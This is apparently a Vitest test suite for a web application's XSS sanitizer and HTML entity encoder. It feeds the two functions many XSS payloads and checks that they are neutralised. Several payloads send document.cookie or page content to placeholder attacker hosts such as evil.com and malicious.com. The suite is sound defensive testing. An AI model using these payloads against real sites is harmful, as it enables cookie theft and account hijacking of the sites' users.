import { describe, it, expect, vi } from 'vitest';
import { cleanText, htmlEntityEncode } from '../../../src/utils/validators';

// Mock console to avoid noise in test output
vi.spyOn(console, 'log').mockImplementation(() => {});
vi.spyOn(console, 'warn').mockImplementation(() => {});

describe('Security - XSS Prevention', () => {
  describe('HTML Sanitization - cleanText()', () => {
    it('should remove dangerous script tags', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '<SCRIPT>alert("xss")</SCRIPT>',
        '<script type="text/javascript">alert("xss")</script>',
        '<script src="malicious.js"></script>',
        '<script>fetch("/steal-data")</script>',
        'Hello <script>alert("xss")</script> World',
        '<script>document.cookie="evil=1"</script>'
      ];

      maliciousInputs.forEach(input => {
        const result = cleanText(input);
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('</script>');
        expect(result).not.toContain('alert');
        expect(result).not.toContain('fetch');
      });
    });

    it('should remove dangerous HTML elements', () => {
      const dangerousElements = [
        '<iframe src="malicious.html"></iframe>',
        '<object data="malicious.swf"></object>',
        '<embed src="malicious.swf"></embed>',
        '<applet code="Malicious.class"></applet>',
        '<form action="/submit" method="post"></form>',
        '<input type="text" name="data">',
        '<textarea>user input</textarea>',
        '<select><option>choice</option></select>',
        '<button onclick="malicious()">Click</button>',
        '<link rel="stylesheet" href="malicious.css">',
        '<meta http-equiv="refresh" content="0;url=malicious.com">',
        '<base href="https://malicious.com">',
        '<svg><script>alert("xss")</script></svg>',
        '<math><script>alert("xss")</script></math>'
      ];

      dangerousElements.forEach(element => {
        const result = cleanText(element);
        // Should not contain any HTML tags
        expect(result).not.toMatch(/<[^>]*>/);
      });
    });

    it('should remove HTML event handlers', () => {
      const eventHandlers = [
        '<div onclick="alert(\'xss\')">Click me</div>',
        '<img src="image.jpg" onerror="alert(\'xss\')" alt="test">',
        '<body onload="malicious()">content</body>',
        '<input type="text" onfocus="steal_data()" value="test">',
        '<a href="#" onmouseover="alert(\'xss\')">Link</a>',
        '<p onmouseout="malicious()">Text</p>',
        '<div onkeydown="evil()">Content</div>',
        '<span onsubmit="attack()">Form</span>'
      ];

      eventHandlers.forEach(handler => {
        const result = cleanText(handler);
        expect(result).not.toMatch(/on\w+\s*=/);
        expect(result).not.toContain('alert');
        expect(result).not.toContain('malicious');
        expect(result).not.toContain('steal_data');
        expect(result).not.toContain('evil');
        expect(result).not.toContain('attack');
      });
    });

    it('should remove javascript: protocol references', () => {
      const jsProtocols = [
        '<a href="javascript:alert(\'xss\')">Link</a>',
        '<img src="javascript:alert(\'xss\')" alt="image">',
        'Text with javascript:malicious() embedded',
        '<div style="background: url(javascript:alert(1))">Content</div>',
        'javascript:void(0)',
        'JAVASCRIPT:alert("XSS")',
        'Javascript:eval("code")'
      ];

      jsProtocols.forEach(input => {
        const result = cleanText(input);
        expect(result.toLowerCase()).not.toContain('javascript:');
        expect(result).not.toContain('alert');
        // Note: cleanText preserves some text content but removes dangerous elements
        // The word "malicious" or "eval" might remain if it's just text content
        expect(result).not.toMatch(/<[^>]*>/); // Should not contain any HTML tags
      });
    });

    it('should remove data: URLs with potential scripts', () => {
      const dataUrls = [
        '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
        '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        '<object data="data:text/html,<script>evil()</script>"></object>',
        '<embed src="data:application/x-shockwave-flash,malicious">',
        'data:text/javascript,alert("xss")',
        'data:application/javascript,malicious_code()'
      ];

      dataUrls.forEach(input => {
        const result = cleanText(input);
        // Note: cleanText HTML-entity encodes dangerous characters, so "data:" becomes "data&#x3A;"
        expect(result).not.toContain('data:');
        expect(result).not.toContain('alert');
        expect(result).not.toContain('evil');
        expect(result).not.toMatch(/<[^>]*>/); // Should not contain any HTML tags
      });
    });

    it('should handle nested and encoded attacks', () => {
      const complexAttacks = [
        '<div><script><![CDATA[alert("xss")]]></script></div>',
        '<<script>alert("xss")</script>',
        '<scr<script>ipt>alert("xss")</script>',
        '<SCRIPT SRC="http://malicious.com/xss.js"></SCRIPT>',
        '<IMG SRC="javascript:alert(String.fromCharCode(88,83,83))">',
        '<!--<script>alert("xss")</script>-->',
        '<![CDATA[<script>alert("xss")</script>]]>',
        '<style>@import"javascript:alert(\'XSS\')";</style>',
        '<div style="expression(alert(\'XSS\'))">IE Expression</div>'
      ];

      complexAttacks.forEach(attack => {
        const result = cleanText(attack);
        expect(result).not.toMatch(/<[^>]*>/);
        expect(result).not.toContain('alert');
        expect(result).not.toContain('javascript');
        expect(result).not.toContain('malicious');
        expect(result).not.toContain('expression');
      });
    });

    it('should preserve safe text content', () => {
      const safeInputs = [
        'Hello, World!',
        'This is a normal paragraph with some text.',
        'Email: user@example.com',
        'Phone: (555) 123-4567',
        'Price: $19.99',
        'Date: 2024-01-15',
        'Special chars: !@#$%^&*()_+-=[]{}|;:,.<>?',
        'Unicode: 测试 тест テスト 🎉',
        'Line breaks and\n\ttabs should be handled'
      ];

      safeInputs.forEach(input => {
        const result = cleanText(input);
        expect(result).toBeTruthy();
        expect(result).not.toContain('<script>');
        // Should preserve general content (though formatting may change)
        expect(result.length).toBeGreaterThan(0);
      });
    });

    it('should handle HTML entities correctly', () => {
      const entityInputs = [
        '&lt;script&gt;alert("xss")&lt;/script&gt;',
        '&amp;lt;script&amp;gt;alert("xss")&amp;lt;/script&amp;gt;',
        'Normal text &amp; entities &lt; &gt; &quot; &#x27; &#x2F;',
        '&nbsp;&copy;&reg;&trade;'
      ];

      entityInputs.forEach(input => {
        const result = cleanText(input);
        // cleanText preserves and further encodes HTML entities
        // The word "script" might appear in entity form but no actual script tags
        expect(result).not.toMatch(/<script[^>]*>/i);
        expect(result).not.toMatch(/<[^>]*>/); // Should not contain any actual HTML tags
        expect(result).not.toContain('alert');
      });
    });

    it('should handle empty and null inputs', () => {
      expect(cleanText('')).toBe('');
      expect(cleanText(null)).toBe('null');
      expect(cleanText(undefined)).toBe('undefined');
      expect(cleanText(0)).toBe('0');
      expect(cleanText(false)).toBe('false');
    });

    it('should handle very large inputs efficiently', () => {
      const largeInput = '<script>alert("xss")</script>'.repeat(1000) + 
                        'Safe content here' + 
                        '<iframe>malicious</iframe>'.repeat(500);
      
      const startTime = Date.now();
      const result = cleanText(largeInput);
      const executionTime = Date.now() - startTime;
      
      // Should complete in reasonable time (less than 1 second)
      expect(executionTime).toBeLessThan(1000);
      
      // Should still sanitize properly
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('<iframe>');
      expect(result).not.toContain('alert');
    });

    it('should normalize whitespace and remove comments', () => {
      const messyInput = `
        <div>
          <!-- This is a comment -->
          <p>   Text   with   lots   of   spaces   </p>
          <script>alert("xss")</script>
          <!-- Another comment -->
        </div>
      `;

      const result = cleanText(messyInput);
      
      // Should not contain HTML comments
      expect(result).not.toContain('<!--');
      expect(result).not.toContain('-->');
      
      // Should not contain scripts
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
      
      // Should normalize whitespace
      expect(result).not.toMatch(/\s{2,}/);
      expect(result.trim()).toBeTruthy();
    });
  });

  describe('HTML Entity Encoding - htmlEntityEncode()', () => {
    it('should encode dangerous HTML characters', () => {
      const testCases = [
        { input: '<', expected: '&lt;' },
        { input: '>', expected: '&gt;' },
        { input: '&', expected: '&amp;' },
        { input: '"', expected: '&quot;' },
        { input: "'", expected: '&#x27;' },
        { input: '/', expected: '&#x2F;' },
        { input: '`', expected: '&#x60;' },
        { input: '=', expected: '&#x3D;' }
      ];

      testCases.forEach(({ input, expected }) => {
        expect(htmlEntityEncode(input)).toBe(expected);
      });
    });

    it('should encode complex strings with multiple dangerous characters', () => {
      const complexInputs = [
        {
          input: '<script>alert("xss")</script>',
          shouldContain: ['&lt;', '&gt;', '&quot;']
        },
        {
          input: 'Hello & "World" <test>',
          shouldContain: ['&amp;', '&quot;', '&lt;', '&gt;']
        },
        {
          input: "onclick='alert(`xss`)'",
          shouldContain: ['&#x27;', '&#x60;']
        },
        {
          input: 'path=/admin&user=admin',
          shouldContain: ['&#x2F;', '&amp;', '&#x3D;']
        }
      ];

      complexInputs.forEach(({ input, shouldContain }) => {
        const result = htmlEntityEncode(input);
        shouldContain.forEach(entity => {
          expect(result).toContain(entity);
        });
        
        // Should not contain original dangerous characters
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('alert');
      });
    });

    it('should preserve safe characters', () => {
      const safeInput = 'Hello World 123 ABC xyz !@#$%^*()_+-[]{}|;:.,?';
      const result = htmlEntityEncode(safeInput);
      
      // Should preserve most characters, only encoding the dangerous ones
      expect(result).toContain('Hello World');
      expect(result).toContain('123');
      expect(result).toContain('ABC xyz');
      expect(result).toContain('!@#$%^*()_+-[]{}|;:.,?');
    });

    it('should handle empty and edge case inputs', () => {
      expect(htmlEntityEncode('')).toBe('');
      expect(htmlEntityEncode('no dangerous chars')).toBe('no dangerous chars');
      expect(htmlEntityEncode('&&&')).toBe('&amp;&amp;&amp;');
      expect(htmlEntityEncode('<<<>>>')).toBe('&lt;&lt;&lt;&gt;&gt;&gt;');
    });

    it('should be idempotent for already-encoded strings', () => {
      const alreadyEncoded = '&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;';
      const result = htmlEntityEncode(alreadyEncoded);
      
      // Should re-encode the & characters
      expect(result).toContain('&amp;lt;');
      expect(result).toContain('&amp;gt;');
      expect(result).toContain('&amp;quot;');
    });

    it('should handle Unicode characters correctly', () => {
      const unicodeInput = 'Testing 测试 тест テスト 🎉 & < > " \' / ` =';
      const result = htmlEntityEncode(unicodeInput);
      
      // Should preserve Unicode but encode dangerous HTML chars
      expect(result).toContain('测试');
      expect(result).toContain('тест');
      expect(result).toContain('テスト');
      expect(result).toContain('🎉');
      expect(result).toContain('&amp;');
      expect(result).toContain('&lt;');
      expect(result).toContain('&gt;');
    });
  });

  describe('Combined XSS Protection', () => {
    it('should handle real-world XSS attack vectors', () => {
      const realWorldAttacks = [
        // Common XSS payloads
        '<script>document.location="http://malicious.com/steal?cookie="+document.cookie</script>',
        '<img src=x onerror="fetch(\'/api/steal?data=\'+btoa(document.innerHTML))">',
        '<svg onload="new Image().src=\'http://evil.com/steal?\'+document.cookie">',
        '<iframe srcdoc="<script>parent.postMessage(document.cookie,\'*\')</script>">',
        '<style>@import"javascript:alert(String.fromCharCode(88,83,83))";</style>',
        
        // Encoded attacks
        '&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;',
        '%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E',
        
        // Event handler attacks
        '<input onfocus="document.location=\'http://evil.com/?c=\'+document.cookie" autofocus>',
        '<body onhashchange="eval(location.hash.slice(1))">',
        
        // CSS-based attacks
        '<div style="background:url(javascript:alert(1))">',
        '<div style="expression(alert(\'XSS\'))">',
        
        // Data URI attacks
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">',
        '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>'
      ];

      realWorldAttacks.forEach(attack => {
        const cleaned = cleanText(attack);
        const encoded = htmlEntityEncode(cleaned);
        
        // Should not contain dangerous patterns
        expect(cleaned.toLowerCase()).not.toContain('script');
        expect(cleaned.toLowerCase()).not.toContain('alert');
        expect(cleaned.toLowerCase()).not.toContain('javascript');
        expect(cleaned.toLowerCase()).not.toContain('document.cookie');
        expect(cleaned.toLowerCase()).not.toContain('document.location');
        expect(cleaned.toLowerCase()).not.toContain('eval(');
        expect(cleaned).not.toContain('malicious.com');
        expect(cleaned).not.toContain('evil.com');
        
        // Should not contain HTML tags after cleaning
        expect(cleaned).not.toMatch(/<[^>]*>/);
        
        // Encoded result should be safe for HTML context
        expect(encoded).not.toContain('<');
        expect(encoded).not.toContain('>');
        expect(encoded).not.toContain('"');
        expect(encoded).not.toContain("'");
      });
    });

    it('should protect against stored XSS scenarios', () => {
      // Simulate user input that would be stored and later displayed
      const userInputs = [
        'Normal user comment',
        'User comment with <script>alert("stored xss")</script> embedded',
        '<img src="profile.jpg" onerror="steal_session()"> My profile',
        'Check out this link: <a href="javascript:malicious()">Click here</a>',
        'My bio: <div style="background:url(javascript:alert(1))">About me</div>',
        'Status: <!--<script>document.location="http://evil.com"</script>--> Online'
      ];

      userInputs.forEach(input => {
        // Simulate the sanitization process for stored data
        const sanitized = cleanText(input);
        const encoded = htmlEntityEncode(sanitized);
        
        // When later displayed, should be safe
        expect(sanitized).not.toMatch(/<script[\s\S]*?<\/script>/i);
        expect(sanitized).not.toMatch(/on\w+\s*=/i);
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toMatch(/style\s*=.*expression/i);
        
        // Should be safe to insert into HTML
        expect(encoded).not.toContain('<');
        expect(encoded).not.toContain('"');
        expect(encoded).not.toContain("'");
      });
    });

    it('should maintain content usability while ensuring security', () => {
      const mixedContent = `
        <div class="user-content">
          <h2>My Blog Post</h2>
          <p>This is a normal paragraph with some <strong>bold text</strong> and <em>italic text</em>.</p>
          <p>Here's a legitimate email: contact@example.com</p>
          <p>And a phone number: (555) 123-4567</p>
          <script>alert("This should be removed")</script>
          <p>But this content should be preserved!</p>
          <img src="image.jpg" onerror="malicious()" alt="This alt text is fine">
          <a href="javascript:evil()" onclick="attack()">This link is dangerous</a>
          <p>Price: $19.99 - Available now!</p>
        </div>
      `;

      const result = cleanText(mixedContent);
      
      // Should preserve legitimate content
      expect(result).toContain('My Blog Post');
      expect(result).toContain('normal paragraph');
      expect(result).toContain('contact@example.com');
      expect(result).toContain('(555) 123-4567');
      expect(result).toContain('content should be preserved');
      expect(result).toContain('$19.99');
      expect(result).toContain('Available now');
      
      // Should remove all dangerous content
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
      expect(result).not.toContain('malicious');
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('attack');
      expect(result).not.toContain('evil');
      
      // Should not contain any HTML tags
      expect(result).not.toMatch(/<[^>]*>/);
    });
  });
});